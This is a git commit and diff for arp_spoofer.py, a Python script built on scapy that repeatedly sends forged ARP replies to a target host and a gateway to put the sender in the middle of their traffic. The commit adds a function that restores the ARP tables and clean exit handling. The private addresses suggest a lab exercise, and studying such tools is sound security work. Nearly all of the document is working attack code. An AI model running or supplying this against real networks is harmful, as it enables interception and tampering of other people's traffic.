70089f6d4bfd433709cfc8edf97cc0a50f0ab938
Andreas W <31095453+Sir-Casm@users.noreply.github.com>
2022-08-23 09:00:17 +0200

    added exception handling on script exit
    + added function to restore the initial values
    + added exception handling for exiting script with KeyboardInterrupt (ctrl + c), including restoration of the initial values
    + added variables for setting up target_ip and gateway_ip

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -18,13 +18,28 @@ def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = l2.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
+    
+  
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = l2.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
 
 
-packet_counter = 0
-while True:
-    spoof("10.0.2.4", "10.0.2.1")
-    spoof("10.0.2.1", "10.0.2.4")
-    packet_counter = packet_counter + 1
-    print("\rPackets sent: " + str(packet_counter)),
-    sys.stdout.flush()
-    time.sleep(2)
+target_ip = "10.0.2.4"
+gateway_ip = "10.0.2.1"
+try:
+    packet_counter = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        packet_counter = packet_counter + 1
+        print("\rPackets sent: " + str(packet_counter)),
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\nExiting script. Restoring ARP tables, please wait.\n")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+    print("Done.")
